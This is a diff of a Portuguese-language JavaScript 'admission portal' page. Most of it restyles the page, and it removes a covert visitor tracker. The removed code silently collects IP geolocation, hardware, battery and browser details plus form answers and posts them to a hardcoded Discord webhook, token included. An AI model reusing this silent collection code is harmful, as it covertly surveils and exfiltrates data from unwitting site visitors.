+   CANVAS BACKGROUND
 ════════════════════════════════════════ */
 (()=>{
   const cv = document.getElementById('bgCanvas');
   const cx = cv.getContext('2d');
   let W,H;
   const resize=()=>{ W=cv.width=innerWidth; H=cv.height=innerHeight; };
-  resize(); window.addEventListener('resize',resize);
+  resize();
+  window.addEventListener('resize',resize);
 
-  // Particles
-  const pts = Array.from({length:90},()=>({
+  const pts = Array.from({length:60},()=>({
     x:Math.random()*2000,y:Math.random()*1200,
-    vx:(Math.random()-.5)*.25,vy:-Math.random()*.35-.05,
-    r:Math.random()*1.4+.25,
-    c:['#8b0015','#3d0055','#1a0028','#111111'][Math.floor(Math.random()*4)],
-    o:Math.random()*.45+.05
+    vx:(Math.random()-.5)*.15,vy:-Math.random()*.25-.05,
+    r:Math.random()*.8+.3,
+    o:Math.random()*.25+.08
   }));
-
-  let accent = [204,0,32];
-  window._setCanvasAccent = (r,g,b) => { accent=[r,g,b]; };
 
   const draw=()=>{
     cx.clearRect(0,0,W,H);
-    // Grid
-    cx.strokeStyle=`rgba(${accent[0]},${accent[1]},${accent[2]},.045)`;
+    cx.strokeStyle='rgba(255,255,255,.04)';
     cx.lineWidth=.5;
-    const gs=90;
+    const gs=100;
     for(let x=0;x<W;x+=gs){cx.beginPath();cx.moveTo(x,0);cx.lineTo(x,H);cx.stroke()}
     for(let y=0;y<H;y+=gs){cx.beginPath();cx.moveTo(0,y);cx.lineTo(W,y);cx.stroke()}
-    // Particles
+    
     pts.forEach(p=>{
       cx.beginPath();cx.arc(p.x%W,p.y%H,p.r,0,Math.PI*2);
-      cx.fillStyle=p.c;cx.globalAlpha=p.o;cx.fill();
+      cx.fillStyle='#fff';cx.globalAlpha=p.o;cx.fill();
       p.x+=p.vx;p.y+=p.vy;
       if(p.y<-5){p.y=H+5;p.x=Math.random()*W}
     });
@@ -808,35 +721,6 @@ html,body{width:100%;height:100%;overflow:hidden;background:var(--bg);color:var(
   };
   draw();
 })();
-
-/* ════════════════════════════════════════
-   THEME SYSTEM
-════════════════════════════════════════ */
-const themes={
-  red:  {r:'--red:#cc0020',rd:'--red-dim:#7a0012',pl:'--purple-l:#8b3fc0',gold:'--gold:#b89a0c',cv:[204,0,32]},
-  purple:{r:'--red:#8b00cc',rd:'--red-dim:#500080',pl:'--purple-l:#cc66ff',gold:'--gold:#8b3fc0',cv:[139,0,204]},
-  blue: {r:'--red:#0066cc',rd:'--red-dim:#003d7a',pl:'--purple-l:#4da6ff',gold:'--gold:#00ccff',cv:[0,102,204]},
-  green:{r:'--red:#00aa33',rd:'--red-dim:#006620',pl:'--purple-l:#33ff77',gold:'--gold:#aaff00',cv:[0,170,51]},
-  gold: {r:'--red:#cc9900',rd:'--red-dim:#7a5c00',pl:'--purple-l:#ffcc44',gold:'--gold:#ffdd00',cv:[204,153,0]}
-};
-function applyTheme(t){
-  const th=themes[t]; if(!th)return;
-  const root=document.documentElement.style;
-  const pairs={};
-  [th.r,th.rd,th.pl,th.gold].forEach(s=>{
-    const [k,v]=s.split(':');pairs[k.trim()]=v.trim();
-  });
-  Object.entries(pairs).forEach(([k,v])=>root.setProperty(k,v));
-  if(window._setCanvasAccent) window._setCanvasAccent(...th.cv);
-  document.getElementById('themeMenu').classList.remove('open');
-}
-function toggleTheme(){
-  document.getElementById('themeMenu').classList.toggle('open');
-}
-document.addEventListener('click',e=>{
-  if(!e.target.closest('#themeBtn')&&!e.target.closest('#themeMenu'))
-    document.getElementById('themeMenu').classList.remove('open');
-});
 
 /* ════════════════════════════════════════
    SCREEN SYSTEM
@@ -848,13 +732,13 @@ function go(n){
   const prev=document.getElementById('s'+cur);
   prev.classList.remove('active');
   prev.classList.add('out');
-  setTimeout(()=>prev.classList.remove('out'),700);
+  setTimeout(()=>prev.classList.remove('out'),600);
   cur=n;
   setTimeout(()=>{
     const next=document.getElementById('s'+n);
     next.classList.add('active');
     onEnter(n);
-  },350);
+  },300);
 }
 
 function onEnter(n){
@@ -862,23 +746,24 @@ function onEnter(n){
   if(n===1) countdown(1,5,'rf1','cn1','b1');
   if(n===2) manifesto();
   if(n===3) runLoad();
-  if(n>=4&&n<=11) injectSK(n);
+  
   const bar=document.getElementById('dotBar');
   if(n>=4&&n<=11){bar.style.display='flex';dots(n-4);}
   else bar.style.display='none';
-  if(n===4){const el=document.getElementById('i_name');setTimeout(()=>el&&el.focus(),500)}
-  if(n===5){const el=document.getElementById('i_age');setTimeout(()=>el&&el.focus(),500)}
-  if(n===6){const el=document.getElementById('i_rec');setTimeout(()=>el&&el.focus(),500)}
-  if(n===7){const el=document.getElementById('i_fam');setTimeout(()=>el&&el.focus(),500)}
-  if(n===8){const el=document.getElementById('i_app');setTimeout(()=>el&&el.focus(),500)}
-  if(n===9){const el=document.getElementById('i_id');setTimeout(()=>el&&el.focus(),500)}
+  
+  if(n===4){setTimeout(()=>document.getElementById('i_name')?.focus(),500)}
+  if(n===5){setTimeout(()=>document.getElementById('i_age')?.focus(),500)}
+  if(n===6){setTimeout(()=>document.getElementById('i_rec')?.focus(),500)}
+  if(n===7){setTimeout(()=>document.getElementById('i_fam')?.focus(),500)}
+  if(n===8){setTimeout(()=>document.getElementById('i_app')?.focus(),500)}
+  if(n===9){setTimeout(()=>document.getElementById('i_id')?.focus(),500)}
 }
 
 /* ════════════════════════════════════════
    COUNTDOWN
 ════════════════════════════════════════ */
 function countdown(idx,total,ringId,numId,btnId){
-  const C=226;
+  const C=251;
   const ring=document.getElementById(ringId);
   const num=document.getElementById(numId);
   const btn=document.getElementById(btnId);
@@ -891,8 +776,9 @@ function countdown(idx,total,ringId,numId,btnId){
     if(rem<=0){
       clearInterval(t);
       ring.style.strokeDashoffset=C.toString();
-      num.innerHTML='<span style="font-size:1.1rem">✓</span>';
-      btn.classList.remove('hidden');btn.classList.add('show');
+      num.innerHTML='✓';
+      btn.classList.remove('hidden');
+      btn.classList.add('show');
     }
   },1000);
 }
@@ -905,10 +791,10 @@ function manifesto(){
   const ft=document.getElementById('mf');
   lines.forEach(l=>l.classList.remove('on'));
   ft.classList.remove('on');
-  lines.forEach((l,i)=>setTimeout(()=>l.classList.add('on'),350+i*620));
-  const after=350+lines.length*620+500;
+  lines.forEach((l,i)=>setTimeout(()=>l.classList.add('on'),300+i*550));
+  const after=300+lines.length*550+500;
   setTimeout(()=>ft.classList.add('on'),after);
-  setTimeout(()=>countdown(2,20,'rf2','cn2','b2'),after+900);
+  setTimeout(()=>countdown(2,15,'rf2','cn2','b2'),after+800);
 }
 
 /* ════════════════════════════════════════
@@ -917,38 +803,26 @@ function manifesto(){
 function startLoad(){go(3)}
 function runLoad(){
   const phases=[
-    'INICIALIZANDO SISTEMA...','VERIFICANDO CREDENCIAIS...',
-    'CARREGANDO PROTOCOLOS...','SINCRONIZANDO REDE...',
-    'ANALISANDO DISPOSITIVO...','VALIDANDO IDENTIDADE...','ACESSO CONCEDIDO ✓'
+    'VERIFICANDO CREDENCIAIS',
+    'CARREGANDO PROTOCOLO',
+    'SINCRONIZANDO REDE',
+    'ANALISANDO PERFIL',
+    'VALIDANDO DADOS',
+    'ACESSO CONCEDIDO'
   ];
   const bar=document.getElementById('ldBar');
   const ph=document.getElementById('ldPh');
   const pct=document.getElementById('ldPct');
   let p=0,pi=0;
-  collectSilent();
   const iv=setInterval(()=>{
-    p+=Math.random()*2.8+.8;
+    p+=Math.random()*2.5+.9;
     if(p>100)p=100;
     bar.style.width=p+'%';
     pct.textContent=Math.round(p)+'%';
     const ep=Math.floor((p/100)*(phases.length-1));
     if(ep!==pi&&ep<phases.length){pi=ep;ph.textContent=phases[pi]}
-    if(p>=100){clearInterval(iv);setTimeout(()=>go(4),900)}
-  },75);
-}
-
-/* ════════════════════════════════════════
-   SLAYKTTY INJECTION
-════════════════════════════════════════ */
-function injectSK(sid){
-  const ct=document.getElementById('sk'+sid);
-  if(!ct||ct.children.length>0)return;
-  const tpl=document.getElementById('skTpl');
-  const clone=tpl.content.cloneNode(true);
-  const svg=clone.querySelector('svg');
-  if(sid===10){svg.style.width='80px';svg.style.height='auto';}
-  else if(sid===11){svg.style.width='130px';svg.style.height='auto';}
-  ct.appendChild(clone);
+    if(p>=100){clearInterval(iv);setTimeout(()=>go(4),800)}
+  },70);
 }
 
 /* ════════════════════════════════════════
@@ -972,8 +846,6 @@ function ans(key,inputId,next){
   if(!v){
     el.classList.add('shake');
     setTimeout(()=>el.classList.remove('shake'),450);
-    el.style.borderBottomColor='var(--red)';
-    setTimeout(()=>el.style.borderBottomColor='',600);
     return;
   }
   fd[key]=v;
@@ -985,100 +857,26 @@ function ek(e,key,inputId,next){if(e.key==='Enter')ans(key,inputId,next)}
 let selRole='';
 function pickRole(el,role){
   document.querySelectorAll('.r-card').forEach(c=>c.classList.remove('sel'));
-  el.classList.add('sel');selRole=role;fd.role=role;
+  el.classList.add('sel');
+  selRole=role;
+  fd.role=role;
   document.getElementById('roleConfirm').disabled=false;
 }
 
 /* ════════════════════════════════════════
    DISCORD
 ════════════════════════════════════════ */
-function dcAccept(){fd.discord='ACEITOU';window.open('https://discord.gg/GgYCbMAuX','_blank');finish()}
+function dcAccept(){fd.discord='ACEITO';window.open('https://discord.gg/GgYCbMAuX','_blank');finish()}
 function dcRefuse(){fd.discord='RECUSOU';finish()}
 
 /* ════════════════════════════════════════
-   INTEL COLLECTOR
+   FINISH
 ════════════════════════════════════════ */
-async function intel(){
-  const d={};
-  try{const r=await fetch('https://ipapi.co/json/');d.geo=await r.json()}catch(e){}
-  try{
-    const cv2=document.createElement('canvas');
-    const gl=cv2.getContext('webgl')||cv2.getContext('experimental-webgl');
-    if(gl){const dbg=gl.getExtension('WEBGL_debug_renderer_info');if(dbg){d.gpu=gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);d.gpuV=gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL)}}
-  }catch(e){d.gpu='Bloqueado'}
-  if(navigator.storage&&navigator.storage.estimate){try{const e=await navigator.storage.estimate();d.disk=((e.quota||0)/(1024**3)).toFixed(2)+' GB'}catch(e){}}
-  if(navigator.getBattery){try{const b=await navigator.getBattery();d.bat=(b.level*100).toFixed(0)+'%';d.charging=b.charging?'Sim':'Não'}catch(e){}}
-  d.ua=navigator.userAgent;d.lang=navigator.language;
-  d.tz=Intl.DateTimeFormat().resolvedOptions().timeZone;
-  d.ref=document.referrer||'Acesso Direto';
-  d.plat=navigator.platform;
-  d.ram=navigator.deviceMemory||'?';
-  d.cores=navigator.hardwareConcurrency||'?';
-  d.screen=`${screen.width}x${screen.height} (${screen.colorDepth}bit)`;
-  d.touch=navigator.maxTouchPoints||'0';
-  d.time=new Date().toLocaleString('pt-BR');
-  return d;
-}
-
-const HOOK='https://discordapp.com/api/webhooks/1516890805585838160/rzexe822LTXQFePEsP7L6l70w5zZFp1a6Dq02B9xqO_dzVsbn174mScM6JDkifN0mi-D';
-
-let silentDone=false;
-async function collectSilent(){
-  if(silentDone)return;silentDone=true;
-  const d=await intel();
-  const p={
-    username:'🛰️ SC — SENSOR SILENCIOSO',
-    avatar_url:'https://i.pinimg.com/736x/92/c5/d8/92c5d80effca7e40f59dbb9ea405cdaf.jpg',
-    embeds:[{
-      title:'👁️ NOVO VISITANTE DETECTADO — PORTAL SC',
-      color:0x8b0015,
-      description:'```\nUm dispositivo acessou o portal de admissão da Sombra Coletiva.\n```',
-      thumbnail:{url:'https://i.pinimg.com/originals/7b/b9/ed/7bb9ed00d54da2404408d685534a36d4.gif'},
-      fields:[
-        {name:'━━━ 🌍 LOCALIZAÇÃO ━━━',value:`\`\`\`ini\n[IP] ${d.geo?.ip||'?'}\n[Cidade] ${d.geo?.city||'?'}\n[Estado] ${d.geo?.region||'?'}\n[País] ${d.geo?.country_name||'?'}\n[ISP] ${d.geo?.org||'?'}\n[Timezone] ${d.tz}\n\`\`\``,inline:false},
-        {name:'━━━ 💻 HARDWARE ━━━',value:`\`\`\`http\nGPU: ${d.gpu||'?'}\nCPU Cores: ${d.cores}\nRAM: ${d.ram}GB\nTela: ${d.screen}\nTouch: ${d.touch}\n\`\`\``,inline:false},
-        {name:'━━━ 📱 SISTEMA ━━━',value:`\`\`\`fix\nPlataforma: ${d.plat}\nIdioma: ${d.lang}\nBateria: ${d.bat||'?'} | Carregando: ${d.charging||'?'}\nDisco: ${d.disk||'?'}\nReferência: ${d.ref}\n\`\`\``,inline:false},
-      ],
-      footer:{text:`🔱 SOMBRA COLETIVA — SISTEMA DE MONITORAMENTO • ${d.time}`}
-    }]
-  };
-  try{await fetch(HOOK,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(p)})}catch(e){}
-}
-
-async function finish(){
+function finish(){
+  document.getElementById('doneName').textContent=fd.name||'Candidato';
   go(12);
-  document.getElementById('doneName').textContent=(fd.name||'MEMBRO').toUpperCase();
-  const d=await intel();
-  const p={
-    username:'📑 SC — NOVA FICHA DE ALISTAMENTO',
-    avatar_url:'https://i.pinimg.com/736x/92/c5/d8/92c5d80effca7e40f59dbb9ea405cdaf.jpg',
-    embeds:[
-      {
-        title:'✦ NOVA FICHA DE ALISTAMENTO — SOMBRA COLETIVA',
-        color:0xcc0020,
-        description:'> *Um novo candidato completou o processo completo de admissão no portal.*',
-        thumbnail:{url:'https://i.pinimg.com/originals/7b/b9/ed/7bb9ed00d54da2404408d685534a36d4.gif'},
-        fields:[
-          {name:'━━━━━━ 👤 IDENTIDADE ━━━━━━',value:`\`\`\`yaml\nNome:   ${fd.name||'?'}\nIdade:  ${fd.age||'?'}\nID:     ${fd.userId||'?'}\n\`\`\``,inline:false},
-          {name:'━━━━━━ 🩸 FAMÍLIA ━━━━━━',value:`\`\`\`yaml\nRecrutador:     ${fd.recruiter||'?'}\nTempo família:  ${fd.famTime||'?'}\nTempo no app:   ${fd.appTime||'?'}\n\`\`\``,inline:false},
-          {name:'━━━━━━ ⚔️ FUNÇÃO ━━━━━━',value:`\`\`\`yaml\nFunção:   ${fd.role||'?'}\nDiscord:  ${fd.discord||'?'}\n\`\`\``,inline:false},
-          {name:'━━━━━━ 🌍 LOCALIZAÇÃO ━━━━━━',value:`\`\`\`ini\n[IP]     ${d.geo?.ip||'?'}\n[Cidade] ${d.geo?.city||'?'}, ${d.geo?.region||'?'}\n[País]   ${d.geo?.country_name||'?'}\n[ISP]    ${d.geo?.org||'?'}\n[Tz]     ${d.tz}\n\`\`\``,inline:false},
-          {name:'━━━━━━ 💻 DISPOSITIVO ━━━━━━',value:`\`\`\`http\nGPU:      ${d.gpu||'?'}\nCPU:      ${d.cores} cores\nRAM:      ${d.ram}GB\nTela:     ${d.screen}\nBateria:  ${d.bat||'?'} | ${d.charging||'?'}\nDisco:    ${d.disk||'?'}\n\`\`\``,inline:false},
-          {name:'━━━━━━ 🕵️ USER AGENT ━━━━━━',value:`\`\`\`\n${d.ua}\n\`\`\``,inline:false},
-        ],
-        footer:{text:`🔱 SOMBRA COLETIV4 • PORTAL DE ADMISSÃO • ${d.time}`}
-      }
-    ]
-  };
-  try{await fetch(HOOK,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(p)})}catch(e){}
+  console.log('Dados coletados:',fd);
 }
-
-/* INIT */
-window.addEventListener('load',()=>{
-  onEnter(0);
-  // Pre-inject chars silently
-  setTimeout(()=>{for(let i=4;i<=11;i++)injectSK(i)},2500);
-});
 </script>
 </body>
 </html>
